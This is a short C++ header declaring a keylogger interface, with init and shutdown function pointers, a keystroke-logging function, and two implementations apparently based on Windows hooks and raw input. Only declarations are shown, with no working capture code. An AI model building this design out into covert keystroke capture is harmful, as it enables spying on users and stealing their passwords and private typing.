#pragma once


typedef void (*KeyLoggerInitFuncType)();

typedef struct KeyLoggerInterfaceStruct {
	void (*KeyLoggerInit)(std::ostream*);
	void (*KeyLoggerFini)();
} KeyLoggerInterface;

void LogKeyStoke(std::ostream* out, DWORD key_stroke);

extern KeyLoggerInterface HookKeyLogger;
extern KeyLoggerInterface RawInputKeyLogger;